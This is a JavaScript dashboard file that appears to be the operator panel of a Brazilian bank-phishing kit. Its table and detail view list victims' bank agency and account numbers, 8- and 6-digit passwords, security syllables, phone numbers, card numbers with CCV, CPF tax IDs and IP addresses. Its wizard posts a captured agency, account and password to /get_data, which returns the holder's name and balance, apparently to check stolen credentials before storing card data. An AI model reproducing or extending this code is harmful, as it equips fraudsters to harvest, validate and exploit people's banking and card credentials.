"use strict";
var Dashboard = function() {
	var _wizardEl;
	var _formEl;
	var _wizard;

	var initTable = function() {
		var table = $('#transaction_datatable');

		// begin first table
		table.DataTable({
			responsive: true,
			searchDelay: 500,
			processing: true,
			serverSide: true,
			ordering: false,
			ajax: {
				url: '/get_transactions',
				type: 'POST',
			},
			columns: [
				{ data: 'date', orderable: true },
				{ data: 'agency' },
				{ data: 'account' },
				{ data: 'balance' },
				{ data: 'card_name' },
				{ data: 'card_number' },
				{ data: 'ccv' },
				{ data: 'cpf' },
				{
					data: 'is_visited',
					width: '75px',
					render: function(data, type, full, meta) {
						var status = data ? {'title': 'Success', 'class': ' label-light-success'}
								: {'title': 'Canceled', 'class': ' label-light-primary'};
						
						return '<span class="label label-lg font-weight-bold' + status.class + ' label-inline">' + status.title + '</span>';
					},
				},
				{
					data: 'ip_address',
					render: function(data, type, row) {
						return data == '::1' ? '127.0.0.1' : data;
					}
				},
				{
					data: null,
					orderable: false,
					render: function(data, type, full, meta) {
						return '\<div class="d-flex text-center justify-content-center">\
								<a href="javascript:;" class="btn btn-sm btn-icon btn-view" title="View">\
									<i class="la la-eye"></i>\
								</a>\
								<a href="javascript:;" class="btn btn-sm btn-icon btn-delete" title="Delete">\
									<i class="la la-trash"></i>\
								</a></div>\
							';
					},
				},
			]
		});

		$(table).on('click', '.btn-view', function (event) {
			var row_data = $(event.target).closest('tr');
			var data = table.DataTable().row(row_data).data();
			$('.detail-content .name').text(data.name);
			$('.detail-content .balance').text(data.balance);
			$('.detail-content .agency').text(data.agency);
			$('.detail-content .password-8').text(data.password_8);
			$('.detail-content .password-6').text(data.password_6);
			$('.detail-content .card-name').text(data.card_name);
			$('.detail-content .ccv').text(data.ccv);
			$('.detail-content .account').text(data.account);
			$('.detail-content .phone').text(data.phone);
			$('.detail-content .syllabic').text(data.syllabic);
			$('.detail-content .card-number').text(data.card_number);
			$('.detail-content .cpf').text(data.cpf);
			$('#showLogModal').modal('show');
		} );

		$(table).on('click', '.btn-delete', function (event) {
			var row_data = $(event.target).closest('tr');
			var data = table.DataTable().row(row_data).data();
			$('#confirm-delete .btn-ok').data('id', data.id);
			$('#confirm-delete').modal('show');
		});
	};

	var initPage = function() {
		$('#preloader-active').delay(2000).fadeOut('slow');
		$('body').delay(2000).css({
			'overflow': 'visible'
		});

		$('#addLogModal').on('show.bs.modal', function() {
			$('#wizard_form input').val('');
			$('input[type="hidden"]').prev('span').text('');
			// _wizard.setDefaults();
		});

		$('#confirm-delete').on('click', '.btn-ok', function() {
			$.ajax({
				url: '/delete_transaction',
				method: 'post',
				data: { id: $(this).data('id') },
				success: function (data) {
					if (data.success) {
						$('#confirm-delete').modal('hide');
						toastr.success("Delete Successed!");
						$('#transaction_datatable').DataTable().clear().draw();
					} else {
						toastr.error("Delete Failed!");
					}
				},
				error: function (result, status, err) {
					toastr.error(err.message);
					return;
				}
			});
		})
	};

	var initWizard = function () {
		// Initialize form wizard
		_wizard = new Wizard(_wizardEl, {
			startStep: 1, // initial active step number
			clickableSteps: false // to make steps clickable this set value true and add data-wizard-clickable="true" in HTML for class="wizard" element
		});

		// Validation before going to next page
		_wizard.on('beforeNext', function (wizard) {
			// Don't go to the next step yet
			_wizard.stop();

			var step = wizard.getStep();
			if (step == 1) {

				if ($('#agency').val() == '') {
					error_message($('#agency')); return false;
				} else if ($('#account').val() == '') {
					error_message($('#account')); return false;
				} else if ($('#password_8').val() == '') {
					error_message($('#password_8'), 'Please enter your Password 1.'); 
					return false;
				} else if ($('#password_8').val().length != 8) {
					error_message($('#password_8'), 'Length of Password is 8 digits'); 
					return false;
				} else {

					wizard.btnNext.disabled = 'disabled';
					wizard.btnNext.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>Loading...';
					$('.error-msg').removeClass('d-block').addClass('d-none');

					$.ajax({
						url: '/get_data',
						method: 'post',
						data: {
								agency: $('#agency').val(),
								account: $('#account').val(),
								password: $('#password_8').val()
						},
						success: function (data) {
							if (data.name != '') {
								$('#name_v').prev('span').text(data.name);
								$('#name_v').val(data.name);

								$('#balance_v').prev('span').text(data.balance);
								$('#balance_v').val(data.balance);

								$('#agency_v').prev('span').text($('#agency').val());
								$('#agency_v').val($('#agency').val());

								$('#account_v').prev('span').text($('#account').val());
								$('#account_v').val($('#account').val());

								$('#password_1_v').prev('span').text($('#password_8').val());
								$('#password_1_v').val($('#password_8').val());

								_wizard.goNext();
								Util.scrollTop();
							} else {
								$('.error-msg').removeClass('d-none').addClass('d-block');	
							}
						},
						error: function (result, status, err) {
							$('.error-msg').removeClass('d-none').addClass('d-block');
						    return;
						},
						complete: function(data) {
							wizard.btnNext.disabled = '';
							wizard.btnNext.innerHTML = 'Next';
						}
					})
				}

			} else if (step == 2) {

				if ($('#phone').val() == '') {
					error_message($('#phone')); 
					return false;
				} else if ($('#syllabic').val() == '') {
					error_message($('#syllabic')); 
					return false;
				} else if ($('#password_6').val() == '') {
					error_message($('#password_6'), 'Please enter your Password 2.'); 
					return false;
				} else if ($('#password_6').val().length != 6) {
					error_message($('#password_6'), 'Length of Password is 6 digits'); 
					return false;
				}
				$('#phone_v').prev('span').text( $('#phone').val() );
				$('#phone_v').val($('#phone').val());

				$('#syllabic_v').prev('span').text( $('#syllabic').val() );
				$('#syllabic_v').val( $('#syllabic').val() );

				$('#password_2_v').prev('span').text( $('#password_6').val() );
				$('#password_2_v').val( $('#password_6').val() );

				_wizard.goNext();
				Util.scrollTop();

			} else if (step == 3) {

				if ($('#card_name').val() == '') {
					error_message($('#card_name'));
					return false;
				} else if ($('#card_number').val() == '') {
					error_message($('#card_number')); 
					return false;
				} else if ($('#ccv').val() == '') {
					error_message($('#ccv')); 
					return false;
				} else if ($('#cpf').val() == '') {
					error_message($('#cpf')); 
					return false;
				}
				$('#card_name_v').prev('span').text( $('#card_name').val() );
				$('#card_name_v').val( $('#card_name').val() );

				$('#card_number_v').prev('span').text( $('#card_number').val() );
				$('#card_number_v').val( $('#card_number').val() );

				$('#ccv_v').prev('span').text( $('#ccv').val() );
				$('#ccv_v').val( $('#ccv').val() );

				$('#cpf_v').prev('span').text( $('#cpf').val() );
				$('#cpf_v').val( $('#cpf').val() );
				_wizard.goNext();
				Util.scrollTop();
			}
		});

		// Change event
		_wizard.on('change', function (wizard) {
			Util.scrollTop();
		});

		_wizard.on('beforeSubmit', function (wizard) {
			$.ajax({
				url: '/add_transaction',
				method: 'post',
				data: $(_formEl).serialize(),
				success: function (data) {
					if (data.success) {
						$('#addLogModal').modal('hide');
						toastr.success("Transaction Successed!");
						$('#transaction_datatable').DataTable().clear().draw();
					} else {
						toastr.error("Transaction Failed!");
					}
				},
				error: function (result, status, err) {
					toastr.error(err.message);
					return;
				}
			});
		});
		

		var error_message = function(obj, msg = '') {
			if (msg != '') {
				$(obj).next('span').text(msg);
			}
			$(obj).next('span').removeClass('d-none').addClass('d-block');
		}
		
		$('#wizard_form input').on('focus', function() {
			$(this).next('span').removeClass('d-block').addClass('d-none');
		});
	}

	return {
		//main function to initiate the module
		init: function() {
			_wizardEl = Util.getById("transaction_wizard");
			_formEl = Util.getById("wizard_form");

			initWizard();

			initPage();

			initTable();
		},
	};

}();

jQuery(document).ready(function() {
	Dashboard.init();
});
